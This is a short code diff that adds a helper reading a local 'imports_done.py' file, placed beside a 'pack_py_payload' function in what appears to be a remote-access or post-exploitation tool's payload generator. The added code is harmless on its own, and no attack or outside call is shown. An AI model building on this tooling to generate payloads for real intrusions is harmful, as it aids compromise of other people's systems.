@@ -18,6 +18,14 @@ import logging
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 
+def getLinuxImportedModules():
+    '''
+    '''
+    lines = ""
+    with open(os.path.join(ROOT,"conf","imports_done.py")) as f:
+        lines=f.read()
+    return lines
+
 def pack_py_payload(conf):
     print colorize("[+] ","green")+"generating payload ..."
     fullpayload=[]
